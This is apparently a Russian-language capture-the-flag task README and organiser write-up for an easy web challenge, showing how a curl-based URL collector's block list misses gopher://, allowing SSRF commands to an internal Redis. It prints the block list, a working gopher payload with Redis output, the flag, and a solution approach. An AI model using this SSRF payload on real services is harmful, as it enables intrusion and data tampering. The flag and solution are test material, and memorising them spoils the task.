# c0ll3ct0r | easy | web

## Информация

"Collect urls, earn flags!" - гласила вывезка на одном из новых модных складов

https://collector.web.ozon-ctf-2025.ru

## Деплой

```sh
cd deploy
docker-compose -f docker-compose-prod.yml up --build -d
```

## Выдать участинкам

Архив из директории [public/](public/) и текст из раздела "Информация".

## Описание

Сборщик url'ов, на каждый url шлётся запрос для проверки валидности через curl, юзеру нужно собрать 1 млрд. уникальных 
урлов, тогда получит флаг (скриптом невозможно из-за ограничений сервиса). Счетчик скормленных урлов хранится в redis, 
у curl не запрещён gopher://, можем сформировать запрос к redis, который увеличит счетчик до 1 млрд. для юзера с помощью INCRBY

## Решение

Заходим на сайт, регистрируемся, видим что для полчуения 'Flag #1' нужно отправить 1 млрд. уникальных URL'ов (уникальность на уровне домена).  
Понимаем что сделать это руками/скриптом невозможно (даже если попытаемся упрёмся в лимит).

Смотрим код сервиса. Видим что запросы шлются через curl, после проверяется статус код и уникальность в БД, если всё ок, 
то увеличивается счетчик сданных url'ов с redis.

В коде захардкожены креды от redis:
```go
postgresHost, redisHost := "localhost", "localhost"
	if os.Getenv("ENVIRONMENT") == "production" {
		postgresHost = "postgres"
		redisHost = "redis"
	}
```
Значит есть смысл поискать возможность дернуть Redis.

У curl запрещены протоколы с помощью блэк листа:
```go
var BLOCKED_PROTOCOLS = []string{"DICT", "FILE", "FTP", "FTPS", "IMAP", "IMAPS", "LDAP", "LDAPS", "MQTT", "POP3",
	"POP3S", "RTMP", "RTMPS", "RTSP", "SCP", "SFTP", "SMB", "SMBS", "SMTP", "SMTPS", "TELNET", "TFTP", "WS", "WSS"}
```
А это значит, что возможно что-то забыли закрыть, гуглим, узнаем что забыли закрыть протокол `gopher://`, с помощью
которого как раз таки можно дергать Redis.

А еще замечаем интересную вещь, при невалидном статус коде, нам в респонсе ещё вернётся body ответа на запрос:
```go
if !slices.Contains(ALLOWED_STATUS_CODES, statusCode) {
return c.String(http.StatusBadRequest, "Invalid status code: "+strconv.Itoa(statusCode)+"\nresp: "+responseBody)
}
```

Составляем запрос к Redis (как это делается можно посмотреть [тут](https://www.hackthebox.com/blog/red-island-ca-ctf-2022-web-writeup)):
```json
{
  "url": "gopher://redis:6379/_%0D%0Aauth%20redis%20redis%0D%0Ainfo%0D%0Aquit%0D%0A"
}
```
В ответ получаем:
```
Invalid status code: 0
resp: +OK
$5581
# Server
redis_version:7.4.2
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9d14eaf5f599583e
redis_mode:standalone
os:Linux 6.1.0-30-amd64 x86_64
arch_bits:64
monotonic_clock:POSIX clock_gettime
multiplexing_api:epoll
atomicvar_api:c11-builtin
...
```
А значит всё получилось, осталось составить запрос с INCRBY нужного ключа (счетчика url'ов для нашего аккаунта и получить флаг).  
[Пример эксплойта.]([solve.py](solve/solve.py))

## Флаг

`ozonctf{c0ll3ct0r_url_net_c0ll3ct0r_dom41n_h86d}`

